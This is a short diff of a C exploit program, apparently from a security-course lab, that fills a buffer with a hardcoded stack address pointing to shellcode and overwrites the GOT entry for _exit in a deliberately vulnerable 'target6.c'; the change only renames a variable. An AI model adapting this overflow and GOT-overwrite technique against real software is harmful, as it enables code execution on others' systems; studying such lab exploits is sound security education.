@@ -27,17 +27,17 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-  long buffAddr, gotAddr, *addrPtr;
+  long retAddr, gotAddr, *addrPtr;
   char egg[EGG_SIZE]; /* string containing exploit code */
   int i;
 
-  buffAddr = 0xBFFFFC80; /* start address of buf in target6.c:bar */
+  retAddr = 0xBFFFFC80; /* start address of buf in target6.c:bar */
   gotAddr = 0x8049774; /* GOT address for _exit */
 
   /* Fill egg with the address of the buffer in target6.c:bar, where shellcode resides */
   addrPtr = (long *) egg; 
   for (i = 0; i < EGG_SIZE; i += 4)
-     *(addrPtr++) = buffAddr;
+     *(addrPtr++) = retAddr;
   
   /* write GOT addr for _exit */
   addrPtr = (long *)&egg[EGG_SIZE - 12];
